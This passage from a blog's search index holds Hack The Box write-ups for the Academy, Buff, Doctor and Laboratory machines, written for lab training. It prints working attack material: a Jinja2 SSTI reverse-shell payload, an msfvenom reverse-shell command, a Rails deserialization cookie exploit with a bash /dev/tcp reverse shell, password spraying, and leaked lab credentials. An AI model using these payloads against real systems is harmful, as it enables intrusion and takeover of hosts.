(Ubuntu) |_http-title: Did not follow redirect to http://academy.htb/ 33060/tcp open mysqlx? | fingerprint-strings: | DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: | Invalid message\u0026#34; |_ HY000 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port33060-TCP:V=7.80%I=7%D=11/9%Time=5FA927A7%P=x86_64-pc-linux-gnu%r(N SF:ULL,9,\u0026#34;\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\u0026#34;)%r(GenericLines,9,\u0026#34;\\x05\\0\\0\\0\\x0b\\ SF:x08\\x05\\x1a\\0\u0026#34;)%r(GetRequest,9,\u0026#34;\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\u0026#34;)%r(HTTPOp ...[snip]... SF:x05HY000\u0026#34;)%r(giop,9,\u0026#34;\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\u0026#34;); Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 36.95 seconds Web server gobuster â””â”€$ gobuster dir -u http://academy.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x php,txt --no-error =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://academy.htb [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Extensions: php,txt [+] Timeout: 10s =============================================================== 2023/07/05 17:37:00 Starting gobuster in directory enumeration mode =============================================================== /.php (Status: 403) [Size: 276] /images (Status: 301) [Size: 311] [--\u0026gt; http://academy.htb/images/] /index.php (Status: 200) [Size: 2117] /login.php (Status: 200) [Size: 2627] /register.php (Status: 200) [Size: 3003] /home.php (Status: 302) [Size: 55034] [--\u0026gt; login.php] /admin.php (Status: 200) [Size: 2633] /config.php (Status: 200) [Size: 0] Foothold I started with registering to the Web Server roleid is the most interesting parameter Let\u0026rsquo;s change roleid to 1 We can access admin.php Let\u0026rsquo;s check dev-staging-01.academy.htb We have laravel framework running And found an APP_Key There is a CVE-2018-15133 We can exploit it There is a nice post explaining the CVE Also check this post explaining the attack I spawn my own reverse shell so I can upgrade it User 1 Enumerate for privesc We got db password If we check for password reuse, we successfully login as cry0l1t3 Password spray: crackmapexec ssh 10.10.10.215 -u user.list -p 'mySup3rP4s5w0rd!!' cry0l1t3:mySup3rP4s5w0rd!! User 2 Groups According to [docs], Group adm is used for system monitoring tasks. Members of this group can read many log files in /var/log, and can use xconsole Let\u0026rsquo;s read logs There is a tool aureport, which can be used with --tty to show logs which include passwords in plain text based on following post Use the creds and pwn another user mrb3n:mrb3n_Ac@d3my! Root Check sudo rights Follow the [instructions] and get root ","date":"July 5, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/academy/images/academy.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/academy/","summary":"Academy Enumeration Nmap â””â”€$ nmap -sC -sV -Pn 10.10.10.215 Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-05 17:02 BST Nmap scan report for 10.10.10.215 (10.10.10.215) Host is up (0.18s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 c090a3d835256ffa3306cf8013a0a553 (RSA) | 256 2ad54bd046f0edc93c8df65dabae7796 (ECDSA) |_ 256 e16414c3cc51b23ba628a7b1ae5f4535 (ED25519) 80/tcp open http Apache httpd 2.","tags":["HTB","deserialization","laravel","aureport","vhosts","adm"],"title":"[HTB] Machine: Academy"},{"categories":null,"contents":"Buff Enumeration nmap â””â”€$ nmap -sC -sV -Pn 10.10.10.198 Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-06 16:06 BST Nmap scan report for 10.10.10.198 (10.10.10.198) Host is up (0.11s latency). PORT STATE SERVICE VERSION 7680/tcp open pando-pub? 8080/tcp open http Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6) |_http-title: mrb3n\u0026#39;s Bro Hut |_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6 | http-open-proxy: Potentially OPEN proxy. |_Methods supported:CONNECTION Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 70.73 seconds â””â”€$ gobuster dir -u http://10.10.10.198:8080 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x php,txt --no-error =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.198:8080 [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Extensions: php,txt [+] Timeout: 10s =============================================================== 2023/07/06 16:38:09 Starting gobuster in directory enumeration mode =============================================================== /img (Status: 301) [Size: 341] [--\u0026gt; http://10.10.10.198:8080/img/] /index.php (Status: 200) [Size: 4969] /home.php (Status: 200) [Size: 143] /contact.php (Status: 200) [Size: 4169] /about.php (Status: 200) [Size: 5337] /profile (Status: 301) [Size: 345] [--\u0026gt; http://10.10.10.198:8080/profile/] /register.php (Status: 200) [Size: 137] /feedback.php (Status: 200) [Size: 4252] /Home.php (Status: 200) [Size: 143] /upload (Status: 301) [Size: 344] [--\u0026gt; http://10.10.10.198:8080/upload/] /upload.php (Status: 200) [Size: 107] /Contact.php (Status: 200) [Size: 4169] /About.php (Status: 200) [Size: 5337] /edit.php (Status: 200) [Size: 4282] /license (Status: 200) [Size: 18025] /Index.php (Status: 200) [Size: 4969] /up.php (Status: 200) [Size: 209] /packages.php (Status: 200) [Size: 7791] /examples (Status: 503) [Size: 1058] /include (Status: 301) [Size: 345] [--\u0026gt; http://10.10.10.198:8080/include/] /licenses (Status: 403) [Size: 1203] /facilities.php (Status: 200) [Size: 5961] /Register.php (Status: 200) [Size: 137] /Profile (Status: 301) [Size: 345] [--\u0026gt; http://10.10.10.198:8080/Profile/] /LICENSE (Status: 200) [Size: 18025] /Feedback.php (Status: 200) [Size: 4252] /att (Status: 301) [Size: 341] [--\u0026gt; http://10.10.10.198:8080/att/] /att.php (Status: 200) [Size: 816] /%20 (Status: 403) [Size: 1044] /IMG (Status: 301) [Size: 341] [--\u0026gt; http://10.10.10.198:8080/IMG/] /INDEX.php (Status: 200) [Size: 4969] /License (Status: 200) [Size: 18025] /ex (Status: 301) [Size: 340] [--\u0026gt; http://10.10.10.198:8080/ex/] /*checkout*.php (Status: 403) [Size: 1044] /*checkout* (Status: 403) [Size: 1044] /*checkout*.txt (Status: 403) [Size: 1044] /Img (Status: 301) [Size: 341] [--\u0026gt; http://10.10.10.198:8080/Img/] /boot (Status: 301) [Size: 342] [--\u0026gt; http://10.10.10.198:8080/boot/] /Upload (Status: 301) [Size: 344] [--\u0026gt; http://10.10.10.198:8080/Upload/] /Upload.php (Status: 200) [Size: 107] /phpmyadmin (Status: 403) [Size: 1203] /HOME.php (Status: 200) [Size: 143] Web server Foothold While visiting pages found by gobuster, I found that contact.php reveals the framework and its version Checking searchsploit gives us RCE Let\u0026rsquo;s run it But I wasn\u0026rsquo;t able to change the directories, since it\u0026rsquo;s a webshell and doesn\u0026rsquo;t save states So I wanted to upgrade the shell by uploading nc and geting reverse shell Root When I downloaded the winpeas for enumeration I noticed that in the Downloads directory there is a CloudMe_1112.exe file So I googled about it and checked the ports along with the list of running processes There is indeed CloudMe process running It seemed like it was running periodically since the port 8888 was opening and closing every 1 minute. Searchsploit returns a list of vulnerabilities And we have a match, since our exe file had a version 1.11.2 Let\u0026rsquo;s build a tunnel to expose the port We can use chisel Let\u0026rsquo;s check the exploit Generate payload and modify the PoC msfvenom -a x86 -p windows/shell_reverse_tcp LHOST=10.10.16.12 LPORT=7777 -b '\\x00\\x0A\\x0D' -f python -v payload Launch the listener and run the exploit ","date":"July 5, 2023","hero":"/posts/cybersecurity/hackthebox/machines/windows/buff/images/buff.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/windows/buff/","summary":"Buff Enumeration nmap â””â”€$ nmap -sC -sV -Pn 10.10.10.198 Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-06 16:06 BST Nmap scan report for 10.10.10.198 (10.10.10.198) Host is up (0.11s latency). PORT STATE SERVICE VERSION 7680/tcp open pando-pub? 8080/tcp open http Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6) |_http-title: mrb3n\u0026#39;s Bro Hut |_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6 | http-open-proxy: Potentially OPEN proxy. |_Methods supported:CONNECTION Service detection performed. Please report any incorrect results at https://nmap.","tags":["HTB","chisel","msfvenom","webshell"],"title":"[HTB] Machine: Buff"},{"categories":null,"contents":"Doctor Enumeration Nmap â””â”€$ nmap -Pn -sC -sV 10.10.10.209 -T4 Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-06 19:08 BST Nmap scan report for 10.10.10.209 (10.10.10.209) Host is up (0.11s latency). Not shown: 997 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 594d4ec2d8cfda9da8c8d0fd99a84617 (RSA) | 256 7ff3dcfb2dafcbff9934ace0f8001e47 (ECDSA) |_ 256 530e966b9ce9c1a170516c2dce7b43e8 (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Doctor 8089/tcp open ssl/http Splunkd httpd | ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser | Not valid before: 2020-09-06T15:57:27 |_Not valid after: 2023-09-06T15:57:27 |_http-server-header: Splunkd | http-robots.txt: 1 disallowed entry |_/ |_http-title: splunkd Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 56.13 seconds Web Server gobuster â””â”€$ gobuster dir -u http://10.10.10.209 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 --no-error -x php,txt =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.209 [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Extensions: php,txt [+] Timeout: 10s =============================================================== 2023/07/06 19:11:54 Starting gobuster in directory enumeration mode =============================================================== /.php (Status: 403) [Size: 277] /images (Status: 301) [Size: 313] [--\u0026gt; http://10.10.10.209/images/] /css (Status: 301) [Size: 310] [--\u0026gt; http://10.10.10.209/css/] /js (Status: 301) [Size: 309] [--\u0026gt; http://10.10.10.209/js/] /fonts (Status: 301) [Size: 312] [--\u0026gt; http://10.10.10.209/fonts/] /.php (Status: 403) [Size: 277] /server-status (Status: 403) [Size: 277] We have Splunk on port 8089 Foothold We have an email info@doctors.htb If we add doctors.htb to /etc/hosts file and visit it, we are redirected to /login?next=%2F Which is served under Werkzeug/1.0.1 Python/3.8.2 We can create an account and check what\u0026rsquo;s inside We can create posts If we check the source, we have /archive I tested for sqli but found nothing We might have SSTI, so let\u0026rsquo;s test it I started with basic payloads from the post There was nothing on the post page, but if we visit /archive page we see the results Let\u0026rsquo;s get reverse shell I used payload from PayloadAllTheThings {% for x in ().__class__.__base__.__subclasses__() %}{% if \u0026quot;warning\u0026quot; in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(\u0026quot;python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\\\u0026quot;10.10.16.12\\\u0026quot;,6666)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\\\u0026quot;/bin/bash\\\u0026quot;, \\\u0026quot;-i\\\u0026quot;]);'\u0026quot;).read().zfill(417)}}{%endif%}{% endfor %} Launch a listener, create a new post and visit the /archive User Let\u0026rsquo;s run linpeas We find an interesting entry in logs POST /reset_password?email=Guitar123\u0026quot; 500 453 \u0026quot;http://doctor.htb/reset_password It happens to be shaun\u0026rsquo;s password Root linpeas found nothing Then I started enumerating splunk searchsploit has nothing Found an interesting repo SplunkWhisperer2s Let\u0026rsquo;s test it Well, it works Let\u0026rsquo;s get our root ","date":"July 5, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/doctor/images/doctor.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/doctor/","summary":"Doctor Enumeration Nmap â””â”€$ nmap -Pn -sC -sV 10.10.10.209 -T4 Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-06 19:08 BST Nmap scan report for 10.10.10.209 (10.10.10.209) Host is up (0.11s latency). Not shown: 997 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 594d4ec2d8cfda9da8c8d0fd99a84617 (RSA) | 256 7ff3dcfb2dafcbff9934ace0f8001e47 (ECDSA) |_ 256 530e966b9ce9c1a170516c2dce7b43e8 (ED25519) 80/tcp open http Apache httpd 2.","tags":["HTB"],"title":"[HTB] Machine: Doctor"},{"categories":null,"contents":"Laboratory Enumeration Nmap â””â”€$ nmap -Pn -sC -sV 10.10.10.216 -T4 Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-06 18:25 BST Nmap scan report for 10.10.10.216 (10.10.10.216) Host is up (0.13s latency). Not shown: 997 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 25ba648f799d5d95972c1bb25e9b550d (RSA) |_ 256 7720ffe946c068921a0b2129d153aa87 (ED25519) 80/tcp open http Apache httpd 2.4.41 |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Did not follow redirect to https://laboratory.htb/ 443/tcp open ssl/http Apache httpd 2.4.41 ((Ubuntu)) | tls-alpn: |_ http/1.1 | ssl-cert: Subject: commonName=laboratory.htb | Subject Alternative Name: DNS:git.laboratory.htb | Not valid before: 2020-07-05T10:39:28 |_Not valid after: 2024-03-03T10:39:28 |_http-title: The Laboratory |_http-server-header: Apache/2.4.41 (Ubuntu) |_ssl-date: TLS randomness does not represent time Service Info: Host: laboratory.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 38.24 seconds gobuster â””â”€$ gobuster dir -u https://laboratory.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x php,txt --no-error -k =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: https://laboratory.htb [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Extensions: php,txt [+] Timeout: 10s =============================================================== 2023/07/06 18:37:13 Starting gobuster in directory enumeration mode =============================================================== /images (Status: 301) [Size: 319] [--\u0026gt; https://laboratory.htb/images/] /assets (Status: 301) [Size: 319] [--\u0026gt; https://laboratory.htb/assets/] /CREDITS.txt (Status: 200) [Size: 442] wfuzz ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u 'https://laboratory.htb' -H 'Host: FUZZ.laboratory.htb' -fs 7254 wfuzz -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u https://laboratory.htb -H \u0026quot;Host: FUZZ.laboratory.htb\u0026quot; --hh 7254 â””â”€$ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u \u0026#39;https://laboratory.htb\u0026#39; -H \u0026#39;Host: FUZZ.laboratory.htb\u0026#39; -fc 200 -mc all /\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.0.0-dev ________________________________________________ :: Method : GET :: URL : https://laboratory.htb :: Wordlist : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt :: Header : Host: FUZZ.laboratory.htb :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: all :: Filter : Response status: 200 ________________________________________________ [Status: 502, Size: 2940, Words: 460, Lines: 94, Duration: 244ms] * FUZZ: git Foothold git.laboratory.htb Let\u0026rsquo;s register We have a possible user dexter If we check the searchsploit, we have a possible hit We have a version: 12.8.1 We have a possible CVE-2020-10977 POC The poc works According to this [post], it can also be turned into RCE We need to get /opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml Using same poc let\u0026rsquo;s grab that file secret_key_base: 3231f54b33e0c1ce998113c083528460153b19542a70173b4458a21e845ffa33cc45ca7486fc8ebb6b2727cc02feea4c3adbe2cc7b65003510e4031e164137b3 We need to generate a cookie with our payload that we will send to the target Read the followitng post So we spawn our own gitlab instance sudo docker run gitlab/gitlab-ce:12.8.1-ce.0 Check the container and open its\u0026rsquo; shell â””â”€$ sudo docker ps [sudo] password for kali: CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES f875151cb6b1 gitlab/gitlab-ce:12.8.1-ce.0 \u0026#34;/assets/wrapper\u0026#34; About a minute ago Up About a minute (health: starting) 22/tcp, 80/tcp, 443/tcp trusting_black Update \u0026lsquo;secret_key_base\u0026rsquo; root@f875151cb6b1:/# nano /opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml root@f875151cb6b1:/# gitlab-ctl restart ok: run: alertmanager: (pid 8278) 0s ok: run: gitaly: (pid 8291) 0s ok: run: gitlab-exporter: (pid 8306) 0s ok: run: gitlab-workhorse: (pid 8324) 1s ok: run: grafana: (pid 8334) 0s ok: run: logrotate: (pid 8346) 0s ok: run: nginx: (pid 8429) 1s ok: run: postgres-exporter: (pid 8435) 0s ok: run: postgresql: (pid 8445) 1s ok: run: prometheus: (pid 8454) 0s ok: run: redis: (pid 8465) 1s ok: run: redis-exporter: (pid 8470) 0s ok: run: sidekiq: (pid 8478) 0s ok: run: sshd: (pid 8484) 0s ok: run: unicorn: (pid 8491) 0s Check the key root@f875151cb6b1:/# gitlab-rails console -------------------------------------------------------------------------------- GitLab: 12.8.1 (d18b43a5f5a) FOSS GitLab Shell: 11.0.0 PostgreSQL: 10.12 -------------------------------------------------------------------------------- Loading production environment (Rails 6.0.2) irb(main):001:0\u0026gt; Rails.application.env_config[\u0026#34;action_dispatch.secret_key_base\u0026#34;] =\u0026gt; \u0026#34;3231f54b33e0c1ce998113c083528460153b19542a70173b4458a21e845ffa33cc45ca7486fc8e\\nbb6b2727cc02feea4c3adbe2cc7b65003510e4031e164137b3\u0026#34; irb(main):002:0\u0026gt; Let\u0026rsquo;s generate a payload based on the following report request = ActionDispatch::Request.new(Rails.application.env_config) request.env[\u0026#34;action_dispatch.cookies_serializer\u0026#34;] = :marshal cookies = request.cookie_jar erb = ERB.new(\u0026#34;\u0026lt;%= `bash -c \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.16.2/6666 0\u0026gt;\u0026amp;1\u0026#39;` %\u0026gt;\u0026#34;) depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb, :result, \u0026#34;@result\u0026#34;, ActiveSupport::Deprecation.new) cookies.signed[:cookie] = depr puts cookies[:cookie] irb(main):001:0\u0026gt; Rails.application.env_config[\u0026#34;action_dispatch.secret_key_base\u0026#34;] =\u0026gt; \u0026#34;3231f54b33e0c1ce998113c083528460153b19542a70173b4458a21e845ffa33cc45ca7486fc8e\\nbb6b2727cc02feea4c3adbe2cc7b65003510e4031e164137b3\u0026#34; irb(main):002:0\u0026gt; request = ActionDispatch::Request.new(Rails.application.env_config) =\u0026gt; #\u0026lt;ActionDispatch::Request:0x00007f552d878348 @env={\u0026#34;action_dispatch.parameter_filter\u0026#34;=\u0026gt;[/token$/, ... irb(main):003:0\u0026gt; request.env[\u0026#34;action_dispatch.cookies_serializer\u0026#34;] = :marshal =\u0026gt; :marshal irb(main):004:0\u0026gt; cookies = request.cookie_jar =\u0026gt; #\u0026lt;ActionDispatch::Cookies::CookieJar:0x00007f5527d21da0 @set_cookies={}, @delete_cookies={}, ... irb(main):005:0\u0026gt; erb = ERB.new(\u0026#34;\u0026lt;%= `bash -c \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.16.2/6666 0\u0026gt;\u0026amp;1\u0026#39;` %\u0026gt;\u0026#34;) =\u0026gt; #\u0026lt;ERB:0x00007f5527d9ac78 @safe_level=nil, @src=\u0026#34;#coding:UTF-8\\n_erbout = +\u0026#39;\u0026#39;; _erbout.\u0026lt;\u0026lt;(( `bash -c \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.16.2/6666 0\u0026gt;\u0026amp;1\u0026#39;` ).to_s); _erbout\u0026#34;, @encoding=#\u0026lt;Encoding:UTF-8\u0026gt;, @frozen_string=nil, @filename=nil, @lineno=0\u0026gt; irb(main):020:0\u0026gt; depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb, :result, \u0026#34;@result\u0026#34;, ActiveSupport::Deprecation.new) bash: connect: Connection refused bash: /dev/tcp/10.10.16.2/6666: Connection refused =\u0026gt; \u0026#34;\u0026#34; irb(main):021:0\u0026gt; cookies.signed[:cookie] = depr DEPRECATION WARNING: @result is deprecated! Call result.is_a? instead of @result.is_a?. Args: [Hash] (called from irb_binding at (irb):21) bash: connect: Connection refused bash: /dev/tcp/10.10.16.2/6666: Connection refused bash: connect: Connection refused bash: /dev/tcp/10.10.16.2/6666: Connection refused =\u0026gt; \u0026#34;\u0026#34; irb(main):022:0\u0026gt; puts cookies[:cookie] BAhvOkBBY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbjo6RGVwcmVjYXRlZEluc3RhbmNlVmFyaWFibGVQcm94eQk6DkBpbnN0YW5jZW86CEVSQgs6EEBzYWZlX2xldmVsMDoJQHNyY0kidCNjb2Rpbmc6VVRGLTgKX2VyYm91dCA9ICsnJzsgX2VyYm91dC48PCgoIGBiYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE2LjIvNjY2NiAwPiYxJ2AgKS50b19zKTsgX2VyYm91dAY6BkVGOg5AZW5jb2RpbmdJdToNRW5jb2RpbmcKVVRGLTgGOwpGOhNAZnJvemVuX3N0cmluZzA6DkBmaWxlbmFtZTA6DEBsaW5lbm9pADoMQG1ldGhvZDoLcmVzdWx0OglAdmFySSIMQHJlc3VsdAY7ClQ6EEBkZXByZWNhdG9ySXU6H0FjdGl2ZVN1cHBvcnQ6OkRlcHJlY2F0aW9uAAY7ClQ=--340332f213dbdec0821e3f4a8d7e4f3279accbb9 =\u0026gt; nil Send a request according to the post â””â”€$ curl -vvv -k \u0026#39;https://git.laboratory.htb/users/sign_in\u0026#39; -b \u0026#34;experimentation_subject_id=BAhvOkBBY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbjo6RGVwcmVjYXRlZEluc3RhbmNlVmFyaWFibGVQcm94eQk6DkBpbnN0YW5jZW86CEVSQgs6EEBzYWZlX2xldmVsMDoJQHNyY0kidCNjb2Rpbmc6VVRGLTgKX2VyYm91dCA9ICsnJzsgX2VyYm91dC48PCgoIGBiYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE2LjIvNjY2NiAwPiYxJ2AgKS50b19zKTsgX2VyYm91dAY6BkVGOg5AZW5jb2RpbmdJdToNRW5jb2RpbmcKVVRGLTgGOwpGOhNAZnJvemVuX3N0cmluZzA6DkBmaWxlbmFtZTA6DEBsaW5lbm9pADoMQG1ldGhvZDoLcmVzdWx0OglAdmFySSIMQHJlc3VsdAY7ClQ6EEBkZXByZWNhdG9ySXU6H0FjdGl2ZVN1cHBvcnQ6OkRlcHJlY2F0aW9uAAY7ClQ=--340332f213dbdec0821e3f4a8d7e4f3279accbb9\u0026#34; * Trying 10.10.10.216:443... * Connected to git.laboratory.htb (10.10.10.216) port 443 (#0) * ALPN: offers h2,http/1.1 * TLSv1.3 (OUT), TLS handshake, Client hello (1): * TLSv1.3 (IN), TLS handshake, Server hello (2): * TLSv1.3 (IN), TLS handshake, Encrypted Extensions (8): * TLSv1.3 (IN), TLS handshake, Certificate (11): * TLSv1.3 (IN), TLS handshake, CERT verify (15): * TLSv1.3 (IN), TLS handshake, Finished (20): * TLSv1.3 (OUT), TLS change cipher, Change cipher spec (1): * TLSv1.3 (OUT), TLS handshake, Finished (20): * SSL connection using TLSv1.3 / TLS_AES_256_GCM_SHA384 * ALPN: server accepted http/1.1 * Server certificate: * subject: CN=laboratory.htb * start date: Jul 5 10:39:28 2020 GMT * expire date: Mar 3 10:39:28 2024 GMT * issuer: CN=laboratory.htb * SSL certificate verify result: self-signed certificate (18), continuing anyway. * using HTTP/1.1 \u0026gt; GET /users/sign_in HTTP/1.1 \u0026gt; Host: git.laboratory.htb \u0026gt; User-Agent: curl/7.88.1 \u0026gt; Accept: */* \u0026gt; Cookie: experimentation_subject_id=BAhvOkBBY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbjo6RGVwcmVjYXRlZEluc3RhbmNlVmFyaWFibGVQcm94eQk6DkBpbnN0YW5jZW86CEVSQgs6EEBzYWZlX2xldmVsMDoJQHNyY0kidCNjb2Rpbmc6VVRGLTgKX2VyYm91dCA9ICsnJzsgX2VyYm91dC48PCgoIGBiYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE2LjIvNjY2NiAwPiYxJ2AgKS50b19zKTsgX2VyYm91dAY6BkVGOg5AZW5jb2RpbmdJdToNRW5jb2RpbmcKVVRGLTgGOwpGOhNAZnJvemVuX3N0cmluZzA6DkBmaWxlbmFtZTA6DEBsaW5lbm9pADoMQG1ldGhvZDoLcmVzdWx0OglAdmFySSIMQHJlc3VsdAY7ClQ6EEBkZXByZWNhdG9ySXU6H0FjdGl2ZVN1cHBvcnQ6OkRlcHJlY2F0aW9uAAY7ClQ=--340332f213dbdec0821e3f4a8d7e4f3279accbb9 \u0026gt; * TLSv1.3 (IN), TLS handshake, Newsession Ticket (4): * TLSv1.3 (IN), TLS handshake, Newsession Ticket (4): * old SSL session ID is stale, removing Get your foothold â””â”€$ nc -lvnp 6666 listening on [any] 6666 ... connect to [10.10.16.2] from (UNKNOWN) [10.10.10.216] 43024 bash: cannot set terminal process group (402): Inappropriate ioctl for device bash: no job control in this shell git@git:~/gitlab-rails/working$ User We are inside the container based on our enumeration .dockerenv and empty /home Running deepce had no success So let\u0026rsquo;s open gitlab-rails console and make our user an admin to see if there are other projects Cheetshee git@git:~/gitlab-rails/working$ gitlab-rails console -------------------------------------------------------------------------------- GitLab: 12.8.1 (d18b43a5f5a) FOSS GitLab Shell: 11.0.0 PostgreSQL: 10.12 -------------------------------------------------------------------------------- Loading production environment (Rails 6.0.2) irb(main):001:0\u0026gt; user = User.find_by(username: \u0026#34;test\u0026#34;) user = User.find_by(username: \u0026#34;test\u0026#34;) =\u0026gt; #\u0026lt;User id:5 @test\u0026gt; irb(main):002:0\u0026gt; user.admin = TRUE user.admin = TRUE (irb):2: warning: constant ::TRUE is deprecated =\u0026gt; true irb(main):003:0\u0026gt; user.save! user.save! =\u0026gt; true irb(main):004:0\u0026gt; And we find another project with id_rsa in it Let\u0026rsquo;s connect via ssh Root Now let\u0026rsquo;s enumerate the box If we run linpeas or look for SUID files we see an interesting binary 7838 20 -rwsr-xr-x 1 root dexter 16720 Aug 28 2020 /usr/local/bin/docker-security Let\u0026rsquo;s run ltrace dexter@laboratory:~$ ltrace /usr/local/bin/docker-security setuid(0) = -1 setgid(0) = -1 system(\u0026#34;chmod 700 /usr/bin/docker\u0026#34;chmod: changing permissions of \u0026#39;/usr/bin/docker\u0026#39;: Operation not permitted \u0026lt;no return ...\u0026gt; --- SIGCHLD (Child exited) --- \u0026lt;... system resumed\u0026gt; ) = 256 system(\u0026#34;chmod 660 /var/run/docker.sock\u0026#34;chmod: changing permissions of \u0026#39;/var/run/docker.sock\u0026#39;: Operation not permitted \u0026lt;no return ...\u0026gt; --- SIGCHLD (Child exited) --- \u0026lt;... system resumed\u0026gt; ) = 256 +++ exited (status 0) +++ So suid binaries doesn\u0026rsquo;t have concept of the secure path So we can perform path injection Let\u0026rsquo;s create a script that run bash Make it executable Change 